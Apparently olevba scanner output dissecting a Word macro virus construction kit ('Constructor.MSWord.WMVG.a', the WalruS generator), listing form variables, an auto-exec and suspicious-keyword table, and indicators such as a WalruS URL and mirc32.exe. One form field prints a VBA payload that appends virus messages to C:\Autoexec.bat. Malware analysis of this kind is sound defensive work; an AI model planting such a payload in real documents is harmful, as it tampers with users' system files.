b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton23'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton24'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton25'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton26'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton27'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton28'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton29'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton30'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton31'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton32'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton33'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton34'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton36'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton37'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton38'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton39'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton40'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton41'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton43'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton44'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton46'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton35'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton47'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton74'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton75'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i05'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadMsg/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Open "C:\\Autoexec.bat" For Append As #1\r\nPrint #1, "CLS"\r\nPrint #1, "ECHO The WalruS Was Here"\r\nPrint #1, "ECHO Youve Got A Virus"\r\nPrint #1, "HaHaHaHa"\r\nClose #1\r\nApplication.Caption = "The WalruS"'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton74'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton75'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadPlugin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton12'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton9'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton7'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton8'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton10'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton11'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadRandom/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGVirusCreated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.WalruS.8k|URL                                          |
|          |.com                |                                             |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |Backup.vbs          |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
|Hex String|4slv                |34736C76                                     |
|Hex String|%uu'                |25757527                                     |
+----------+--------------------+---------------------------------------------+

